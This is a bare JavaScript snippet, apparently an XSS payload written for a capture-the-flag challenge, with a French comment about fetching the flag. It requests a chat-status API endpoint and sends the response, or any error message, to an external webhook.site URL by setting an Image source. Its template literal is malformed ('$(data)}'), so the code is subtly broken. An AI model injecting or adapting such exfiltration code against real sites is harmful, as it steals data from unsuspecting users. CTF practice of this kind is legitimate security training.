function exfiltrate(data) {
  const exfilUrl = `https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59?flag=$(data)}`;
  new Image().src = exfilUrl;
}

// Récupérer le flag depuis l'API
fetch('/chat-status/1fd12eac-0f55-40b6-8641-69c200a6f8cf')
  .then(response => response.text())
  .then(data => exfiltrate(data))
  .catch(error => exfiltrate('Error: ' + error.message));
